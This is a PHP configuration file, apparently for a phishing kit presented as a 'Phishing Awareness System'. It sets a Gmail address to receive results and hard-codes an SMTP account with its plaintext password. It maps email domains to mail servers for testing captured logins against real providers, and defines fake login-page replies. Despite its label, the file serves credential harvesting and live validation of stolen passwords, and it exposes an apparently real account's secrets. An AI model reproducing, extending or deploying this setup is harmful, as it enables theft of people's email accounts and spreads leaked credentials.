<?php
/**
 * Phishing Awareness System Configuration
 * 
 * This file contains all configuration settings for the phishing awareness program.
 * Update these settings according to your environment.
 */

// Email notification settings
define('NOTIFICATION_EMAIL', 'skkho87.sm@gmail.com'); // Email to receive notifications
define('SMTP_HOST', 'mail.debtclearsa.co.za'); // Your SMTP server
define('SMTP_USERNAME', 'ajitha@debtclearsa.co.za'); // Your SMTP username
define('SMTP_PASSWORD', 'Nn19871024@@'); // Your SMTP password
define('SMTP_PORT', 587); // Your SMTP port
define('SMTP_SECURITY', 'tls'); // tls or ssl

// System settings
define('LOG_FILE', 'phishing_awareness_log.txt'); // Log file name
define('MAX_ATTEMPTS_PER_IP', 50); // Maximum attempts per IP before temporary block
define('ENABLE_GEOLOCATION', true); // Enable/disable geolocation lookup
define('DEBUG_MODE', false); // Enable debug mode for troubleshooting

// SMTP servers to test for credential validation
$SMTP_TEST_SERVERS = [
    // Common email providers
    'gmail.com' => [
        'host' => 'smtp.gmail.com',
        'ports' => [587, 465],
        'security' => ['tls', 'ssl']
    ],
    'outlook.com' => [
        'host' => 'outlook.office365.com',
        'ports' => [587, 993],
        'security' => ['tls', 'ssl']
    ],
    'hotmail.com' => [
        'host' => 'outlook.office365.com',
        'ports' => [587, 993],
        'security' => ['tls', 'ssl']
    ],
    'yahoo.com' => [
        'host' => 'smtp.yahoo.com',
        'ports' => [587, 465],
        'security' => ['tls', 'ssl']
    ],
    // Generic patterns for other domains
    'default' => [
        'hosts' => ['mail.{domain}', 'smtp.{domain}'],
        'ports' => [587, 465, 993, 25],
        'security' => ['tls', 'ssl']
    ]
];

// Security settings
define('ENABLE_RATE_LIMITING', true); // Enable rate limiting
define('RATE_LIMIT_WINDOW', 3600); // Rate limit window in seconds (1 hour)
define('RATE_LIMIT_MAX_ATTEMPTS', 20); // Maximum attempts per window

// Response messages
$RESPONSE_MESSAGES = [
    'success' => 'Login successful! Redirecting...',
    'invalid_credentials' => 'Invalid email or password. Please try again.',
    'rate_limited' => 'Too many attempts. Please try again later.',
    'invalid_email' => 'Please enter a valid email address.',
    'missing_fields' => 'Email and password are required.',
    'connection_error' => 'Unable to verify credentials. Please try again.',
    'server_error' => 'Server error. Please contact support.'
];

// Get configuration value
function getConfig($key, $default = null) {
    return defined($key) ? constant($key) : $default;
}

// Get SMTP test servers configuration
function getSmtpTestServers() {
    global $SMTP_TEST_SERVERS;
    return $SMTP_TEST_SERVERS;
}

// Get response message
function getResponseMessage($key) {
    global $RESPONSE_MESSAGES;
    return isset($RESPONSE_MESSAGES[$key]) ? $RESPONSE_MESSAGES[$key] : 'Unknown error occurred.';
}

// Log debug message if debug mode is enabled
function debugLog($message) {
    if (getConfig('DEBUG_MODE', false)) {
        error_log("[DEBUG] " . $message);
    }
}
?>